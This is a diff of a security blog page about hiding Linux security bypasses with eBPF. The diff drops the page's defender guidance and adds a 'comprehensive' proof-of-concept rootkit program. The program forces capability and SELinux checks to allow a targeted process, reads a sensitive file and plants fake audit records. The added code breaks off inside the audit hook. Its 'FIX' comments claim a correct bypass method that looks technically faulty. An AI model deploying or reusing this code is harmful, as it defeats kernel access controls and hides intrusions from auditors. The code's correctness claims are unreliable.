@@ -156,243 +156,6 @@
                     
                     
                 
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
             </div>
         </nav>
 
@@ -415,57 +178,31 @@
 
 <p>How eBPF turns capabilities, seccomp, SELinux, and other kernel‑enforced controls into mere reflections—fooling auditors while attacks succeed. This technique creates a deceptive mirror where security controls appear to be functioning normally while being completely bypassed.</p>
 
-<pre><code class="language-mermaid">graph TD
+<pre><code class="language-mermaid">%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
+graph TD
     A["Security Control"] --&gt;|"1. Enforcement Check"| B["Kernel Function"]
     C["eBPF Program"] --&gt;|"2. Hook &amp; Intercept"| B
     B --&gt;|"3. Modified Decision"| D["Allow Operation"]
     E["Audit Log"] --&gt;|"4. False Record"| F["Clean Logs"]
     G["Security Monitor"] --&gt;|"5. Sees Compliance"| H["False Security"]
+    
+    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
+    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
+    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
+    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
+    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
+    style F fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
+    style G fill:#a93226,stroke:#f5b7b1,stroke-width:2px
+    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
+    
+    click A "https://man7.org/linux/man-pages/man7/capabilities.7.html" "Linux Capabilities Documentation"
+    click B "https://elixir.bootlin.com/linux/latest/source/security/security.c" "Kernel Security Implementation"
+    click C "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
 </code></pre>
 
 <p><strong>Why</strong></p>
 
 <p>Because eBPF + misconfiguration =&gt; broken isolation. Modern Linux security relies on multiple layers of kernel-enforced controls like capabilities, seccomp, AppArmor, and SELinux. When eBPF can intercept and modify the enforcement points for these controls, the entire security model is compromised while appearing intact—creating a dangerous false sense of security.</p>
-
-<p><strong>POC</strong></p>
-
-<p><em>Coming soon.</em></p>
-
-<p>The proof of concept will demonstrate:</p>
-<ul>
-  <li>Hooking into key kernel security enforcement functions</li>
-  <li>Modifying security decisions in real-time</li>
-  <li>Maintaining the appearance of proper enforcement</li>
-  <li>Bypassing multiple security layers simultaneously</li>
-  <li>Creating deceptive audit trails that show compliance</li>
-</ul>
-
-<p><strong>Attacker hat on</strong></p>
-
-<ol>
-  <li>Identify a target system with eBPF capabilities and security controls</li>
-  <li>Map the kernel functions responsible for security enforcement</li>
-  <li>Develop eBPF programs that hook into these enforcement points</li>
-  <li>Load the malicious BPF programs with appropriate privileges</li>
-  <li>Modify security decisions to allow otherwise prohibited operations</li>
-  <li>Ensure audit logs show the expected “denied” messages while operations succeed</li>
-  <li>Maintain persistence through the eBPF programs</li>
-</ol>
-
-<p><strong>Defender hat on</strong></p>
-
-<ol>
-  <li>Remove CAP_BPF from untrusted processes and containers</li>
-  <li>Implement BPF LSM policies to restrict eBPF program loading</li>
-  <li>Monitor for unexpected eBPF programs attached to security functions</li>
-  <li>Use multiple, independent security monitoring mechanisms</li>
-  <li>Implement integrity verification for security subsystems</li>
-  <li>Consider using eBPF-based security tools that can detect malicious eBPF usage</li>
-</ol>
-
-<p><strong>Conclusion</strong></p>
-
-<p><code class="language-plaintext highlighter-rouge">eBPF is all you need</code>. The ability to intercept and modify kernel security decisions through eBPF creates a particularly dangerous scenario where attacks succeed while all monitoring systems report compliance. This technique highlights why eBPF capabilities should be treated as highly privileged operations that require strict access controls.</p>
 
 <h2 id="technical-details">Technical Details</h2>
 
@@ -493,7 +230,7 @@
   <li><strong>Create false trails</strong>: Generate deceptive audit records that mask the actual operations</li>
 </ol>
 
-<h3 id="code-snippet">Code Snippet</h3>
+<h3 id="comprehensive-poc">Comprehensive POC</h3>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
@@ -558,83 +295,708 @@
 61
 62
 63
-</pre></td><td class="rouge-code"><pre><span class="c1">// Simplified eBPF program to bypass capability checks</span>
-<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/cap_capable"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_cap_check</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">cred</span><span class="p">,</span> <span class="k">struct</span> <span class="n">user_namespace</span> <span class="o">*</span><span class="n">ns</span><span class="p">,</span>
-               <span class="kt">int</span> <span class="n">cap</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">opts</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="c1">// Get process information</span>
-    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+</pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
+<span class="c1">// @copyable: true</span>
+<span class="c1">// Real-world eBPF exploitation proof of concept (FIXED)</span>
+<span class="c1">// This demonstrates a practical attack scenario for bypassing Linux security controls</span>
+<span class="c1">// while maintaining the appearance of proper enforcement.</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/bpf_helpers.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/version.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/ptrace.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/security.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/audit.h&gt;</span><span class="cp">
+</span>
+<span class="kt">char</span> <span class="n">LICENSE</span><span class="p">[]</span> <span class="n">SEC</span><span class="p">(</span><span class="s">"license"</span><span class="p">)</span> <span class="o">=</span> <span class="s">"GPL"</span><span class="p">;</span>
+
+<span class="c1">// Configuration for our target process</span>
+<span class="cp">#define TARGET_PID 1234        // Process we want to give elevated privileges
+#define TARGET_FILENAME "sensitive_data.txt"  // File we want to access
+</span>
+<span class="c1">// Structure to track security events for logging and analysis</span>
+<span class="k">struct</span> <span class="n">security_event</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span><span class="p">;</span>                <span class="c1">// Process ID</span>
+    <span class="n">u8</span> <span class="n">comm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>            <span class="c1">// Command name</span>
+    <span class="n">u64</span> <span class="n">timestamp</span><span class="p">;</span>          <span class="c1">// Event timestamp</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">security_ptr</span><span class="p">;</span>     <span class="c1">// Pointer to security context</span>
+    <span class="kt">int</span> <span class="n">security_result</span><span class="p">;</span>    <span class="c1">// Original security decision</span>
+    <span class="kt">int</span> <span class="n">modified_result</span><span class="p">;</span>    <span class="c1">// Our modified decision</span>
+    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>      <span class="c1">// Target filename (if applicable)</span>
+    <span class="n">u32</span> <span class="n">audit_id</span><span class="p">;</span>           <span class="c1">// Audit event ID for correlation</span>
+<span class="p">};</span>
+
+<span class="c1">// Map to store our fake audit events for correlation</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_HASH</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">security_event</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">fake_audit_events</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Map to track processes we've modified permissions for</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_HASH</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u8</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">target_processes</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Perf event output for logging</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_PERF_EVENT_ARRAY</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">events</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Helper function to check if this is our target process</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">bool</span> <span class="nf">is_target_process</span><span class="p">(</span><span class="n">u32</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="n">TARGET_PID</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
     
-    <span class="c1">// Check if this is our target process</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
-        <span class="c1">// Allow all capability checks to succeed</span>
-        <span class="c1">// The original function will never execute its check</span>
-        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="p">}</span>
-    
-    <span class="c1">// Let the original function run for other processes</span>
-    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="n">u8</span> <span class="o">*</span><span class="n">tracked</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">tracked</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">tracked</span> <span class="o">==</span> <span class="mi">1</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook SELinux enforcement</span>
-<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/selinux_file_permission"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_selinux</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">cred</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span>
-               <span class="n">u32</span> <span class="n">mask</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="c1">// Get process information</span>
+<span class="c1">// Helper function to check if this is our target file</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">bool</span> <span class="nf">is_target_file</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">target</span><span class="p">[]</span> <span class="o">=</span> <span class="n">TARGET_FILENAME</span><span class="p">;</span>
+    
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">target</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Helper to generate a unique audit ID</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">u32</span> <span class="nf">generate_audit_id</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u64</span> <span class="n">ts</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">u32</span><span class="p">)(</span><span class="n">ts</span> <span class="o">^</span> <span class="n">pid</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// FIX: Use `fentry` and `bpf_override_return` instead of kprobe for a functional bypass.</span>
+<span class="c1">// NOTE: This requires a Linux kernel version 5.10+</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"fentry/cap_capable"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_PROG</span><span class="p">(</span><span class="n">hook_cap_check</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">cred</span><span class="p">,</span> <span class="k">struct</span> <span class="n">user_namespace</span> <span class="o">*</span><span class="n">ns</span><span class="p">,</span>
+             <span class="kt">int</span> <span class="n">cap</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">opts</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     
-    <span class="c1">// Check if this is our target process</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
-        <span class="c1">// Get file path for selective bypassing</span>
-        <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="n">MAX_PATH_LEN</span><span class="p">];</span>
+        <span class="k">struct</span> <span class="n">security_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">(),</span>
+            <span class="p">.</span><span class="n">security_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">cred</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">security_result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="c1">// Original result would be deny (-EPERM)</span>
+            <span class="p">.</span><span class="n">modified_result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>  <span class="c1">// We are forcing an allow</span>
+            <span class="p">.</span><span class="n">audit_id</span> <span class="o">=</span> <span class="n">generate_audit_id</span><span class="p">(),</span>
+        <span class="p">};</span>
+        <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fake_audit_events</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">audit_id</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
+        
+        <span class="c1">// FIX: This is the correct way to bypass the security check.</span>
+        <span class="c1">// It forces `cap_capable` to return 0 (success) and skips the original function.</span>
+        <span class="k">return</span> <span class="n">bpf_override_return</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="c1">// Allow the original function to execute for all other processes.</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// FIX: Use `fentry` and `bpf_override_return` for SELinux checks as well.</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"fentry/selinux_file_permission"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_PROG</span><span class="p">(</span><span class="n">hook_selinux</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mask</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
+        <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
         <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">f_path</span><span class="p">.</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
         
-        <span class="c1">// If this is a sensitive file we want to access</span>
         <span class="k">if</span> <span class="p">(</span><span class="n">is_target_file</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span> <span class="p">{</span>
-            <span class="c1">// Allow access while ensuring audit logs look normal</span>
-            <span class="c1">// This would involve additional hooks into audit functions</span>
-            <span class="n">log_fake_denial</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">mask</span><span class="p">);</span>
+            <span class="k">struct</span> <span class="n">security_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">,</span>
+                <span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">(),</span>
+                <span class="p">.</span><span class="n">security_result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="c1">// Original result would be deny</span>
+                <span class="p">.</span><span class="n">modified_result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>  <span class="c1">// We are forcing an allow</span>
+                <span class="p">.</span><span class="n">audit_id</span> <span class="o">=</span> <span class="n">generate_audit_id</span><span class="p">(),</span>
+            <span class="p">};</span>
+            <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+            <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">filename</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">filename</span><span class="p">));</span>
             
-            <span class="c1">// Allow the operation</span>
-            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fake_audit_events</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">audit_id</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+            <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
+
+            <span class="c1">// FIX: Force the function to return 0 (success/allowed).</span>
+            <span class="k">return</span> <span class="n">bpf_override_return</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
         <span class="p">}</span>
     <span class="p">}</span>
     
-    <span class="c1">// Let the original function run for other cases</span>
-    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="c1">// Allow the original function to execute for other processes/files.</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="c1">// NOTE: Bypassing seccomp is more complex than a simple return value override.</span>
+<span class="c1">// An effective seccomp bypass would involve parsing and modifying the filter</span>
+<span class="c1">// itself, which is a significantly more advanced technique. For this PoC,</span>
+<span class="c1">// we will focus on monitoring seccomp checks rather than bypassing them.</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/seccomp_check_filter"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_seccomp</span><span class="p">,</span> <span class="k">struct</span> <span class="n">seccomp_filter</span> <span class="o">*</span><span class="n">filter</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">struct</span> <span class="n">security_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">(),</span>
+        <span class="p">};</span>
+        <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
 <span class="c1">// Create deceptive audit logs</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/audit_log_start"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_audit</span><span class="p">,</span> <span class="k">struct</span> <span class="n">audit_context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="c1">// Check if this is one of our fake denial logs</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">is_fake_denial</span><span class="p">(</span><span class="n">ctx</span><span class="p">))</span> <span class="p">{</span>
-        <span class="c1">// Modify the audit context to make it look legitimate</span>
-        <span class="c1">// while the actual operation was allowed</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_audit</span><span class="p">,</span> <span class="k">struct</span> <span class="n">audit_context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">u32</span> <span class="n">audit_id</span> <span class="o">=</span> <span class="n">generate_audit_id</span><span class="p">();</span> <span class="c1">// This needs a more reliable correlation method</span>
+        <span class="k">struct</span> <span class="n">security_event</span> <span class="o">*</span><span class="n">event</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fake_audit_events</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">audit_id</span><span class="p">);</span>
         
-        <span class="c1">// This is highly dependent on the specific audit structure</span>
-        <span class="c1">// and would require careful implementation</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// NOTE: Actually modifying audit context here is highly complex</span>
+            <span class="c1">// and kernel-version specific. A real rootkit would need</span>
